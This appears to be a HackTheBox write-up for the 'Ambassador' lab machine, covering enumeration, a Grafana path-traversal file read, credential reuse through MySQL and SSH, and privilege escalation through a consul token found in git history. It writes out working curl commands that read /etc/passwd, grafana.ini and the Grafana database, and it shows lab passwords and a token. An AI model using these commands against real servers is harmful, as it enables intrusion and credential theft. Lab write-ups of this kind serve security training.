---
title: Ambassador writeup
date: 2023-08-16 15:00:00 +0200
categories: [Writeup, HackTheBox]
tags: ["medium-box"]     # TAG names should always be lowercase
img_path: /assets/img/boxes/ambassador/
image: # Thumbnail 
  src: Ambassador.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

## Summary
This box focuses on primarily on enumeration, as well as finding publically available exploits. First, a publicly known exploit in Grafana to achieve arbitrary file read. This must then be leveraged into obtaining the Grafana sqlite database, which in turn contains credentials for a publicly available mysql service. It is then possible to find ssh credentials for a low privileged user on the box via the mysql service. Finally, by enumerating a git repository it is possible to locate a token for a consul application. This, combined with a public exploit for consul can then be used to escalate privileges. 

## Foothold
As usual, let's start out by doing an nmap scan.
```console
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-04 00:42 CET
Nmap scan report for 10.129.228.56
Host is up (0.021s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
3000/tcp open  ppp?
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
```
Interestingly, the box has port 3306 open. As such, let's keep an eye out for any potential database credentials. 

The host is also hosting services on port 22, 80 and 3000. Visiting the site on port 80, we learn there is a user named `developer` with ssh access. 
![](80.png)

Port 3000 is hosting a Grafana instance, which prompts us to login when trying to access it. 
![](3000.png)
Searching for vulnerabilities in Grafana reveals the following [exploit](https://www.exploit-db.com/exploits/50581), which should give us arbitrary file read.  Using the below command, it's possible to enumerate the files on the remote server:
```console
curl --path-as-is  "http://10.129.228.56:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
---SNIP---
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
```
As noted previously, the developer account is indeed present on the box. 

One can use this vulnerability, paired with [this](https://infosecwriteups.com/from-shodan-dork-to-grafana-local-file-inclusion-e77dc4cfc264) article to find the password for the Grafana admin user:
```console
bitis@Workstation ~/h/m/ambassador> curl --path-as-is  "http://10.129.228.56:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini" | grep password
# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = messageInABottle685427
```
Although this is just the default password that we could have probably found via a google search. In any case it works and we can log in as admin on the Grafana service. We can also use the exploit to download the Grafana database:

```
bitis@Workstation ~/h/m/ambassador [23]> curl --path-as-is  "http://10.129.228.56:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db" --output grafana.db
```
Looking through the database we can tell that the only Grafana user that exists is the admin user.
```console
sqlite> .tables
alert                       login_attempt
alert_configuration         migration_log
alert_instance              ngalert_configuration
alert_notification          org
alert_notification_state    org_user
alert_rule                  playlist
alert_rule_tag              playlist_item
alert_rule_version          plugin_setting
annotation                  preferences
annotation_tag              quota
api_key                     server_lock
cache_data                  session
dashboard                   short_url
dashboard_acl               star
dashboard_provisioning      tag
dashboard_snapshot          team
dashboard_tag               team_member
dashboard_version           temp_user
data_source                 test_data
kv_store                    user
library_element             user_auth
library_element_connection  user_auth_token
sqlite> select * from user;
1|0|admin|admin@localhost||dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069|0X27trve2u|f960YdtaMF||1|1|0||2022-03-13 20:26:45|2022-09-01 22:39:38|0|2023-08-16 14:36:37|0
```

However, the database also contains credentials for the `grafana `mysql user: `grafana:dontStandSoCloseToMe63221!` 
```console
sqlite> select * from data_source;
2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-08-16 14:18:10|0|{}|1|uKewFgM4z
sqlite>
```

By using these credentials to access the mysql service identified on the box earlier, it's possible to get the password for the `developer` user in the "whackywidget" database:
```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0,038 sec)

MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0,027 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0,027 sec)

MySQL [whackywidget]>
```
The password is base64 encoded, and decodes to `anEnglishManInNewYork027468`. We can then login to the server via ssh.

## Privilege escalation
As part of our standard linux enumeration we run `pspy64`, and get the following output:

```console
2022/12/04 01:24:07 CMD: UID=0    PID=1033   | /usr/sbin/cron -f
2022/12/04 01:24:07 CMD: UID=0    PID=103    |
2022/12/04 01:24:07 CMD: UID=0    PID=1027   | /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl
2022/12/04 01:24:07 CMD: UID=0    PID=102    |
2022/12/04 01:24:07 CMD: UID=0    PID=101    |
2022/12/04 01:24:07 CMD: UID=0    PID=100    |
2022/12/04 01:24:07 CMD: UID=0    PID=10     |
2022/12/04 01:24:07 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity
2022/12/04 01:25:01 CMD: UID=0    PID=2291   | /usr/sbin/CRON -f
2022/12/04 01:25:01 CMD: UID=0    PID=2293   | /bin/bash /root/cleanup.sh
2022/12/04 01:25:01 CMD: UID=0    PID=2292   | /bin/sh -c /root/cleanup.sh
2022/12/04 01:25:01 CMD: UID=0    PID=2294   | /bin/bash /root/cleanup.sh
```
It seems that the root user is running a program named consul via a cronjob. We find the below [PoC](https://github.com/owalid/consul-rce) for us to achieve command execution via consul. However it requires a consul token to work. Luckily, if we look at the `/opt` directory it contains `/my-app`.
This directory contains a git repository.
```console
developer@ambassador:/opt/my-app$ ls -al
total 24
drwxrwxr-x 5 root root 4096 Mar 13  2022 .
drwxr-xr-x 4 root root 4096 Sep  1  2022 ..
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
developer@ambassador:/opt/my-app$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
```

If we take a look at the differences between some of the commits, we can find the consul token:
```
developer@ambassador:/opt/my-app$ git diff 33a53 c982db
diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index fc51ec0..35c08f6 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
+# Export MYSQL_PASSWORD before running

-consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

We can then get a reverse shell by using the PoC and setting up a listener on our own server.